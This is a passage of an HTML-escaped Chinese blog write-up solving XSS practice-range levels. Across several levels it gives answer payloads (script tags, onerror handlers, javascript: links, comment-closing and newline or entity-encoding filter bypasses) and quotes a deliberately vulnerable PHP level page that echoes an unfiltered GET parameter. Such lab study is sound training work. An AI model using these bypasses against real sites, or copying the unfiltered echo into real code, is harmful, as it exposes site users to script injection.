&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204150455947.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204150455947.png&quot; alt&#x3D;&quot;image-20240204150455947&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&lt;script&gt;alert&lt;&#x2F;code&gt;1&lt;code&gt;&lt;&#x2F;script&gt;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;或：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;a&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;href&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;javascript:alert&lt;&#x2F;span&gt;&#96;&lt;span class&#x3D;&quot;attr&quot;&gt;1&lt;&#x2F;span&gt;\&#96;&gt;&lt;&#x2F;span&gt;123&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;a&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x04&quot;&gt;0x04&lt;&#x2F;h4&gt;
&lt;p&gt;过滤符号：小括号()，中括号[]，反引号&#96; 可使用HTML实体编码绕过&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204151017389.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204151017389.png&quot; alt&#x3D;&quot;image-20240204151017389&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;a&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;href&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;javascript:alert&amp;#40;1&amp;#41;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;123&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;a&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x05&quot;&gt;0x05&lt;&#x2F;h4&gt;
&lt;p&gt;HTML的注释有两种方式：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;comment&quot;&gt;&lt;!-- 注释内容 --&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;comment&quot;&gt;&lt;!-- 注释内容 --!&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204151215313.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204151215313.png&quot; alt&#x3D;&quot;image-20240204151215313&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;--!&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x06&quot;&gt;0x06&lt;&#x2F;h4&gt;
&lt;p&gt;正则表达式匹配了：&lt;strong&gt;auto&lt;&#x2F;strong&gt; 、&lt;strong&gt;以on开头且以&#x3D;结尾的字符串&lt;&#x2F;strong&gt;、 &lt;strong&gt;&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;所以过滤了autofocus和onerror等事件，以及防止input标签被闭合。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204152604165.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204152604165.png&quot; alt&#x3D;&quot;image-20240204152604165&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;可以通过换行&lt;code&gt;%0A&lt;&#x2F;code&gt;来绕过匹配，&lt;strong&gt;答案：&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight txt&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;type&#x3D;&quot;image&quot; src&#x3D;&quot;&quot; onerror&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&#x3D;alert(1)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;onclick&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&#x3D;alert(1)&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x07&quot;&gt;0x07&lt;&#x2F;h4&gt;
&lt;p&gt;本题主要利用html部分单标签可以解析，例如img标签&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204153048091.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204153048091.png&quot; alt&#x3D;&quot;image-20240204153048091&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&lt;img src&#x3D;&quot;&quot; onerror&#x3D;alert(1)&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x08&quot;&gt;0x08&lt;&#x2F;h4&gt;
&lt;p&gt;使用正则过滤&lt;&#x2F;style&gt;,可以多加一个空格或使用换行符造成正则逃逸。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204153220204.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204153220204.png&quot; alt&#x3D;&quot;image-20240204153220204&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&lt;&#x2F;style &gt;&lt;img src&#x3D;1 onerror&#x3D;&quot;alert(1)&quot;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x09&quot;&gt;0x09&lt;&#x2F;h4&gt;
&lt;p&gt;本题使用正则表达式白名单匹配固定网址，可在正确的网址后多加字符，再把前面的双引号闭合，再输入onerror错误事件&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204153430571.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204153430571.png&quot; alt&#x3D;&quot;image-20240204153430571&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;https:&#x2F;&#x2F;www.segmentfault.com&quot; onerror&#x3D;&quot;alert(1)&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x0A&quot;&gt;0x0A&lt;&#x2F;h4&gt;
&lt;p&gt;本题通过html转义, 过滤了所有可注入的关键字，经研究（看答案）可知，可直接引用指定网站下的目录文件来达到xss注入的目的，如在靶场的目录下有个j.js文件, 内有alert(1);代码, 直接调用即可注入，&lt;strong&gt;答案：&lt;code&gt;https:&#x2F;&#x2F;www.segmentfault.com.haozi.me&#x2F;j.js&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;也可用url的@语法来进行跳转调用，例如&lt;code&gt;https:&#x2F;&#x2F;www.baidu.com@www.bing.com&lt;&#x2F;code&gt; ，最终会跳转到bing上，根据此原理可以在其他服务器上事先写好alert(1);并跳转执行。&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x0B&quot;&gt;0x0B&lt;&#x2F;h4&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x0C&quot;&gt;0x0C&lt;&#x2F;h4&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x0D&quot;&gt;0x0D&lt;&#x2F;h4&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x0E&quot;&gt;0x0E&lt;&#x2F;h4&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x0F&quot;&gt;0x0F&lt;&#x2F;h4&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x10&quot;&gt;0x10&lt;&#x2F;h4&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x11&quot;&gt;0x11&lt;&#x2F;h4&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x12&quot;&gt;0x12&lt;&#x2F;h4&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number"></span> <span class="toc-text">、等标签内均可插入标签来执行JavaScript恶意代码&lt;&#x2F;p&gt;
&lt;p&gt;此处可以参考：&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;blog.csdn.net&#x2F;LYJ20010728&#x2F;article&#x2F;details&#x2F;116462782&quot;&gt;XSS常见的触发标签&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202143032203.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202143032203.png&quot; alt&#x3D;&quot;image-20240202143032203&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;20&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;21&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;22&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;23&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;24&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;25&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;!DOCTYPE &lt;span class&#x3D;&quot;keyword&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;comment&quot;&gt;&lt;!--STATUS OK--&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;head&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;meta&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;http-equiv&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;content-type&quot;&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;content&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;span class&#x3D;&quot;variable language_&quot;&gt;window&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;alert&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;keyword&quot;&gt;function&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;params&quot;&gt;&lt;&#x2F;span&gt;)  &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&#123;     &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;span class&#x3D;&quot;title function_&quot;&gt;confirm&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;完成的不错！&quot;&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt; &lt;span class&#x3D;&quot;variable language_&quot;&gt;window&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;location&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;href&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;level2.php?keyword&#x3D;test&quot;&lt;&#x2F;span&gt;; &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&#125;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;title&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;欢迎来到level1&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;title&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;head&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;body&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;h1&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;align&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;欢迎来到level1&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;h1&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;ini_set(&quot;display_errors&quot;, 0);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;$str &#x3D; $_GET[&quot;name&quot;];&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;echo &quot;&lt;h2 align&#x3D;center&gt;欢迎用户&quot;.$str.&quot;&lt;&#x2F;h2&gt;&quot;;&#x2F;&#x2F;这里直接进行调用，根本没有过滤&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;img&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;src&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;level1.png&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;&#x2F;h3&gt;&quot;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;body&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 2&lt;&#x2F;p&gt;
&lt;p&gt;可以尝试如Level 1的方法但是没有成功，再次查看源代码发现第一处的&lt;&gt;符号被html实体转义，只能从第二处进行注入，input标签不可内含script标签，故此处提前闭合input标签，构造一个新的script标签执行恶意代码。&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;1706856310681.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;1706856310681.png&quot; alt&#x3D;&quot;1706856310681&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&quot;&gt;\&lt;script&gt;alert(1)\&lt;&#x2F;script&gt;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span 